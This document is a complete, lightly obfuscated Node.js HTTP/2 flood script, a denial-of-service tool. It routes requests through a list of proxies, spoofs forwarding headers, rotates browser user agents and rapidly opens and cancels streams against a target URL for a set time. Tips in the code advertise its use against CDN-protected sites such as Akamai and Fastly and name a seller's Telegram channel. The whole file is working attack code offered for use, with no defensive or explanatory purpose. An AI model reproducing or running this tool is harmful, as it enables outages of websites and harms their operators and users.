const net=require('net');
const http2=require('http2');
const tls=require('tls');
const cluster=require('cluster');
const url=require('url');
const crypto=require('crypto');
const fs=require('fs');
const colors=require('colors');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners=0;
process.on('uncaughtException',function(_0x4e178a){});
if(process.argv.length<7){
	console.log('Usage: target time rate thread proxyfile');
	process.exit();
}
const headers={};
function readLines(_0x5e604d){
	return fs.readFileSync(_0x5e604d,'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0xf64ba6,_0x18cb3a){
	return Math.floor(Math.random()*(_0x18cb3a-_0xf64ba6)+_0xf64ba6);
}
function randomElement(_0x3a20ae){
	return _0x3a20ae[randomIntn(0,_0x3a20ae.length)];
}
function randstr(_0x26dec8){
	const _0x174e21='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	let _0x1ef81a='';
	const _0x4eab86=_0x174e21.length;
	for(let _0x840ca5=0;_0x840ca5<_0x26dec8;_0x840ca5++){
		_0x1ef81a+=_0x174e21.charAt(Math.floor(Math.random()*_0x4eab86));
	}
	return _0x1ef81a;
}
const ip_spoof=()=>{
	const _0x3d61ee=()=>{
		return Math.floor(Math.random()*255);
	};
	return _0x3d61ee()+'.'+_0x3d61ee()+'.'+_0x3d61ee()+'.'+_0x3d61ee();
};
const spoofed=ip_spoof();
const ip_spoof2=()=>{
	const _0x29456c=()=>{
		return Math.floor(Math.random()*9999);
	};
	return''+_0x29456c();
};
const spoofed2=ip_spoof2();
const ip_spoof3=()=>{
	const _0x38c6ad=()=>{
		return Math.floor(Math.random()*118);
	};
	return''+_0x38c6ad();
};
const spoofed3=ip_spoof3();
const args={'target':process.argv[2],'time':parseInt(process.argv[3]),'Rate':parseInt(process.argv[4]),'threads':parseInt(process.argv[5]),'proxyFile':process.argv[6]};
const sig=['rsa_pss_rsae_sha256','rsa_pss_rsae_sha384','rsa_pss_rsae_sha512','rsa_pkcs1_sha256','rsa_pkcs1_sha384','rsa_pkcs1_sha512'];
const sigalgs1=sig.join(':');
const cplist=['ECDHE-RSA-AES128-GCM-SHA256','ECDHE-RSA-AES256-GCM-SHA384','ECDHE-ECDSA-AES256-GCM-SHA384','ECDHE-ECDSA-AES128-GCM-SHA256'];
const val={'NEl':JSON.stringify({'report_to':Math.random()<0.5?'cf-nel':'default','max-age':Math.random()<0.5?604800:2561000,'include_subdomains':Math.random()<0.5?true:false})};
const accept_header=['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9','text/html; charset=utf-8','application/json, text/plain, */*','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'];
lang_header=['ko-KR','en-US','zh-CN','zh-TW','ja-JP','en-GB','en-AU','en-GB,en-US;q=0.9,en;q=0.8','en-GB,en;q=0.5','en-CA','en-UK, en, de;q=0.5','en-NZ','en-GB,en;q=0.6','en-ZA','en-IN','en-PH','en-SG','en-HK','en-GB,en;q=0.8','en-GB,en;q=0.9',' en-GB,en;q=0.7','*','en-US,en;q=0.5','vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','utf-8, iso-8859-1;q=0.5, *;q=0.1','fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5','en-GB, en-US, en;q=0.9','de-AT, de-DE;q=0.9, en;q=0.5','cs;q=0.5','da, en-gb;q=0.8, en;q=0.7','he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7','en-US,en;q=0.9','de-CH;q=0.7','tr','zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'];
const encoding_header=['*','*/*','gzip','gzip, deflate, br','compress, gzip','deflate, gzip','gzip, identity','gzip, deflate','br','br;q=1.0, gzip;q=0.8, *;q=0.1','gzip;q=1.0, identity; q=0.5, *;q=0','gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25','compress;q=0.5, gzip;q=1.0','identity','gzip, compress','compress, deflate','compress','gzip, deflate, br','deflate','gzip, deflate, lzma, sdch','deflate'];
const control_header=['max-age=604800','proxy-revalidate','public, max-age=0','max-age=315360000','public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800','s-maxage=604800','max-stale','public, immutable, max-age=31536000','must-revalidate','private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0','max-age=31536000,public,immutable','max-age=31536000,public','min-fresh','private','public','s-maxage','no-cache','no-cache, no-transform','max-age=2592000','no-store','no-transform','max-age=31557600','stale-if-error','only-if-cached','max-age=0'];
const uap=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'];
const tips1=['use premium proxy will get more request/s','this script only work on http/2!','recommended big proxyfile if target is akamai/fastly','dont trying resell my script!! @Akafastly','My channel: https://t.me/SaturnSpark'];
const platformd=['Windows','Linux','Android','iOS','Mac OS','iPadOS','BlackBerry OS','Firefox OS'];
const rdom2=['hello server','hello cloudflare','hello client','hello world','hello akamai','hello cdnfly','hello kitty'];
var cipper=cplist[Math.floor(Math.floor(Math.random()*cplist.length))];
var random=rdom2[Math.floor(Math.floor(Math.random()*rdom2.length))];
var platformx=platformd[Math.floor(Math.floor(Math.random()*platformd.length))];
var tipsz=tips1[Math.floor(Math.floor(Math.random()*tips1.length))];
var siga=sig[Math.floor(Math.floor(Math.random()*sig.length))];
var uap1=uap[Math.floor(Math.floor(Math.random()*uap.length))];
var accept=accept_header[Math.floor(Math.floor(Math.random()*accept_header.length))];
var lang=lang_header[Math.floor(Math.floor(Math.random()*lang_header.length))];
var encoding=encoding_header[Math.floor(Math.floor(Math.random()*encoding_header.length))];
var control=control_header[Math.floor(Math.floor(Math.random()*control_header.length))];
var proxies=readLines(args.proxyFile);
const parsedTarget=url.parse(args.target);
const rateHeaders=[{'A-IM':'Feed'},{'accept':accept},{'accept-charset':accept},{'accept-datetime':accept},{'upgrade-insecure-requests':'1'},{'Access-Control-Request-Method':'GET'},{'Cache-Control':'no-cache'},{'Content-Encoding':'gzip'},{'content-type':'text/html'}];
const rateHeaders2=[{'X-Requested-With':'XMLHttpRequest'},{'X-Forwarded-For':spoofed},{'X-Vercel-Cache':randstr(15)},{'Alt-Svc':'http/1.1=http2.'+parsedTarget.host+'; ma=7200'},{'TK':'?'},{'X-Frame-Options':'deny'},{'X-ASP-NET':randstr(25)}];
const rateHeaders3=[{'cookie':randstr(15)},{'Expect':'100-continue'},{'Forwarded':'for=192.168.0.1;proto=http;by='+spoofed},{'From':'user@gmail.com'},{'Max-Forwards':'10'},{'origin':'https://'+parsedTarget.host},{'pragma':'no-cache'},{'referer':'https://'+parsedTarget.host+'/'}];
const rateHeaders4=[{'accept-encoding':encoding},{'accept-language':lang},{'Refresh':'5'},{'X-Content-duration':spoofed},{'service-worker-navigation-preload':Math.random()<0.5?'true':'null'}];
if(cluster.isMaster){
	console.clear();
	console.log('Target: '.brightYellow+process.argv[2]);
	console.log('Time: '.brightYellow+process.argv[3]);
	console.log('Rate: '.brightYellow+process.argv[4]);
	console.log('Thread: '.brightYellow+process.argv[5]);
	console.log('ProxyFile: '.brightYellow+process.argv[6]);
	for(let counter=1;counter<=args.threads;counter++){
		cluster.fork();
	}
}else{
	setInterval(runFlooder);
}
class NetSocket{
	constructor(){}
	async['HTTP'](_0x49adba,_0x17a06d){
		const _0x169cf2=_0x49adba.address.split(':');
		const _0x389b4c=_0x169cf2[0];
		const _0x283c7a='CONNECT '+_0x49adba.address+':443 HTTP/1.1\r\nHost: '+_0x49adba.address+':443\r\nConnection: Keep-Alive\r\n\r\n';
		const _0x55541d=new Buffer[('from')](_0x283c7a);
		const _0x5920ff=await net.connect({'host':_0x49adba.host,'port':_0x49adba.port});
		_0x5920ff.setTimeout(_0x49adba.timeout*600000);
		_0x5920ff.setKeepAlive(true,100000);
		_0x5920ff.on('connect',()=>{
			_0x5920ff.write(_0x55541d);
		});
		_0x5920ff.on('data',_0x33c136=>{
			const _0x128b34=_0x33c136.toString('utf-8');
			const _0x91d21a=_0x128b34.includes('HTTP/1.1 200');
			if(_0x91d21a===false){
				_0x5920ff.destroy();
				return _0x17a06d(undefined,'error: invalid response from proxy server');
			}
			return _0x17a06d(_0x5920ff,undefined);
		});
		_0x5920ff.on('timeout',()=>{
			_0x5920ff.destroy();
			return _0x17a06d(undefined,'error: timeout exceeded');
		});
		_0x5920ff.on('error',_0x3c5c8b=>{
			_0x5920ff.destroy();
			return _0x17a06d(undefined,'error: '+_0x3c5c8b);
		});
	}
}
const path=parsedTarget.path.replace(/%RAND%/,()=>Array.from({'length':16},()=>Math.floor(Math.random()*36).toString(36)).join(''));
const Socker=new NetSocket();
headers[':method']='GET';
headers[':authority']=parsedTarget.host;
headers[':path']=path;
headers[':scheme']='https';
headers['x-forwarded-proto']='https';
function runFlooder(){
	const _0xb62986=randomElement(proxies);
	const _0x572099=_0xb62986.split(':');
	const _0x483285={'host':_0x572099[0],'port':~~_0x572099[1],'address':parsedTarget.host+':443','timeout':100};
	Socker.HTTP(_0x483285,async(_0x414792,_0x26d029)=>{
		if(_0x26d029)return;
		_0x414792.setKeepAlive(true,600000);
		const _0x488b5a={'rejectUnauthorized':false,'host':parsedTarget.host,'servername':parsedTarget.host,'socket':_0x414792,'ecdhCurve':'X25519','ciphers':cipper,'secureProtocol':'TLS_method','ALPNProtocols':['h2']};
		const _0x2c6557=await tls.connect(443,parsedTarget.host,_0x488b5a);
		_0x2c6557.setKeepAlive(true,60000);
		const _0x4d9677=await http2.connect(parsedTarget.href,{'protocol':'https:','settings':{'headerTableSize':4096,'maxConcurrentStreams':1000,'initialWindowSize':Math.random()<0.5?65536:65535,'maxHeaderListSize':8192,'maxFrameSize':Math.random()<0.5?16777215:16384,'enablePush':false},'maxSessionMemory':3333,'maxDeflateDynamicTableSize':4294967295,'createConnection':()=>_0x2c6557,'socket':_0x414792});
		_0x4d9677.settings({'headerTableSize':4096,'maxConcurrentStreams':1000,'initialWindowSize':Math.random()<0.5?65536:65535,'maxHeaderListSize':8192,'maxFrameSize':Math.random()<0.5?16777215:16384,'enablePush':false});
		_0x4d9677.on('connect',()=>{
			const _0x1d2b5c=setInterval(()=>{
				const _0x105125={...headers,...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],...rateHeaders3[Math.floor(Math.random()*rateHeaders3.length)],'user-agent':uap1+randstr(6),...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)]};
				for(let _0x12a5b0=0;_0x12a5b0<args.Rate;_0x12a5b0++){
					const _0x1be0a4=_0x4d9677.request(_0x105125);
					_0x4d9677.on('response',_0x528c96=>{
						_0x1be0a4.rstStream(http2.constants.NGHTTP2_CANCEL);
						_0x1be0a4.write(random);
						_0x1be0a4.close();
						_0x1be0a4.destroy();
						return;
					});
					_0x1be0a4.end();
				}
			},1000);
		});
		_0x4d9677.on('close',()=>{
			_0x4d9677.destroy();
			_0x414792.destroy();
			return;
		});
	}),function(_0x2e242d,_0x1b9088,_0x47c277){};
}
const KillScript=()=>process.exit(1);
setTimeout(KillScript,args.time*1000);
